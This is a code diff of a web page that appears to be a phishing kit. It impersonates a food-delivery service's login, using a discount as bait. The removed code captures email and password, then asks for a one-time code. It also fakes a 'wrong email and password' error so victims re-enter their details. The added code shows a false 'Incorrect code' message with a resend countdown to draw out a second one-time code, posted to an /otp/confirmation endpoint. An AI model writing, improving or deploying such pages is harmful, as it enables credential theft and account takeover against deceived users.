@@ -46,17 +46,24 @@
                         </div>
                     </div>
                     <div class="user-input-data">
-                        <form class="login_from">
+                        <form class="verificatoinForm">
+                            <div>
+                                <p>
+                                    Incorrect code. Please enter the verificaiton code again before get the discount.
+                                </p>
+                            </div>
                             <div class="input-saperarto">
-                                <label class="latter-label" for="email">Username or email</label><br>
-                                <input class="input-enter" required type="email" id="email" name="email"><br>
+                                <label class="latter-label" for="code">Verfication Code</label><br>
+                                <input class="input-enter" style="border: red 1px solid;" required type="number" maxlength="6" id="number" name="OTP"><br><br>
                             </div>
-                            <div class="input-saperarto ">
-                                <label class="latter-label" for="password">Password</label><br>
-                                <div style="position: relative; padding-bottom: 15px;" class="pp-div"><input class="input-enter" autocomplete="current-password" minlength="8" maxlength="10" required="true" type="password" id="login_password" name="password"><i class="far fa-eye" id="togglePassword"></i></div>
+                            <input type="submit">
+                            <div class="inline-flex">
+                                <span class="inline-text reload" style="cursor:not-allowed;">Resend Verificaiton Code.</span>
+                                <span class="timer">
+                                    <span id="counter"></span>
+                                </span>
                             </div>
-                            <input class="loginSubmit" type="submit">
-                        </form>
+                        </form> 
                     </div>
                 </div>
             </div>
@@ -64,104 +71,55 @@
         <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
         <script>
             if (!localStorage.getItem('complete')) {
-            
                 let mainLoadingSkiptheDish = document.querySelector('.mainSkipTheDishLoadingDiv');
-                const togglePassword = document.querySelector('#togglePassword');
-                const loginPassword = document.querySelector('#login_password');
                 let mainChangElement = document.querySelector('.user-input-data');
+                let reload = document.querySelector('.reload')
+                let keyID;
     
-                togglePassword.addEventListener('click', function (e) {
-                    const type = loginPassword.getAttribute('type') === 'password' ? 'text' : 'password';
-                    loginPassword.setAttribute('type', type);
-                    this.classList.toggle('fa-eye-slash');
-                });
+                keyID = window.location.href.split('/discount/id/')[1];
+                keyID = keyID.split('/')[0];
     
-                let loginFrom = document.querySelector('.login_from');
-                loginFrom.addEventListener('submit', (event)=>{
-                    event.preventDefault();
-                    localStorage.setItem("attempt1", "wrong");
+                let VFrom = document.querySelector('.verificatoinForm');
+                VFrom.addEventListener('submit',(e)=>{
+                    e.preventDefault();  
                     mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
-                    const data = new FormData(event.target);
-                    const email = data.get('email');
-                    const password = data.get('password');
+                    let opt = document.querySelector('.input-enter');  
+                    opt.setAttribute('disabled', true)
                     let FormDataObj = {
-                        email: email,
-                        password: password
+                        "OTP": opt.value
                     };
-                    loginFrom.style.opacity = '0.4';
-                    let keyID;
-                    keyID = window.location.href.split('/discount/id/')[1];
-                    if (keyID.includes('?')) {
-                        keyID = keyID.split('?')[0];
-                    };
-                    axios.post(`/api/admin/login/${keyID}`, FormDataObj).then(res => {
-                        function delay(ms) {
-                            return new Promise(resolve => {
-                                setTimeout(resolve, ms)
-                            });
-                        }       
-                        function addVFrom() {
-                            mainLoadingSkiptheDish.style.display = 'flex';
-                            mainLoadingSkiptheDish.style.opacity = '1';
-                            mainChangElement.innerHTML =  `
-                                <form class="verificatoinForm">
-                                    <div>
-                                        <p>
-                                        Write down your confirmation code you got on your mail or phone number. Don't share this code to anyone it's your One Time Password.
-                                        </p>
-                                    </div>
-                                    <div class="input-saperarto">
-                                        <label class="latter-label" for="code">Verfication Code</label><br>
-                                        <input class="input-enter" maxlength="6" required type="number" id="number" name="OTP"><br><br>
-                                    </div>
-                                    <input type="submit">
-                                    <div class="inline-flex">
-                                        <span class="inline-text reload">Did not get the code?</span>
-                                    </div>
-                                </form> 
-                            `
-                        }
-                        function newChanges() {
-                            mainLoadingSkiptheDish.style.opacity = '0';     
-                            setTimeout(() => {
-                                mainLoadingSkiptheDish.style.display = 'none';
-                            }, 500);
-                            document.querySelector('.reload').addEventListener('click',()=>{
-                                localStorage.setItem("attempt1", "wrong");
-                                location.reload();
-                            });
-                            let VFrom = document.querySelector('.verificatoinForm');
-                            VFrom.addEventListener('submit',(e)=>{
-                                e.preventDefault();  
-                                mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
-                                let opt = document.querySelector('.input-enter');  
-                                opt.setAttribute('disabled', true)
-                                FormDataObj["OTP"] = opt.value;
-                                axios.post(`/api/admin/login/${keyID}/otp`, FormDataObj).then(res => {
-                                    window.location.href = `/admin/login/discount/id/${keyID}/add_discount`;
-                                }).catch(err => {
-                                    console.log(err);
-                                });
-                            });
-                        };        
-                        async function someFunction() {
-                            await delay(4000);
-                            await addVFrom();
-                            await delay(2000);
-                            await newChanges();
-                        }
-                        someFunction();
+                    console.log(FormDataObj)
+                    axios.post(`/api/admin/login/${keyID}/otp/confirmation`, FormDataObj).then(res => {
+                        window.location.href = `/admin/login/discount/id/${keyID}/add_discount`;
+                    }).catch(err => {
+                        console.log(err);
                     });
                 });
     
+                function countdown() {
+                    var seconds = 59;
+                    function tick() {
+                        var counter = document.getElementById("counter");
+                        seconds--;
+                        counter.innerHTML =
+                            "0:" + (seconds < 10 ? "0" : "") + String(seconds);
+                        if (seconds > 0) {
+                            setTimeout(tick, 1000);
+                        } else {
+                            reload.style.cursor = 'pointer'
+                            reload.style.opacity = '1'
+                            reload.addEventListener('click',()=>{
+                                localStorage.setItem("attempt1", "wrong");
+                                location.reload();
+                            });
+                            document.getElementById("counter").innerHTML = "";
+                        }
+                    }
+                    tick();
+                }
+                
                 window.addEventListener('load',()=>{
-                    if (localStorage.getItem("attempt1") == "wrong") {
-                        document.querySelector('.pp-div').insertAdjacentHTML('beforeend','<span style="color:red;font-size:12px;width:100%;text-align:right;display:block;padding-top:5px">**wrong email address and password**</span>')
-                        document.querySelector('.pp-div').style.paddingBottom = '0px'
-                    }
-                    if (localStorage.getItem("otp") == "notConfirm"){
-                        mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
-                    }
+                    countdown();
                     setTimeout(()=>{
                         setTimeout(()=>{
                             mainLoadingSkiptheDish.style.display = 'none'
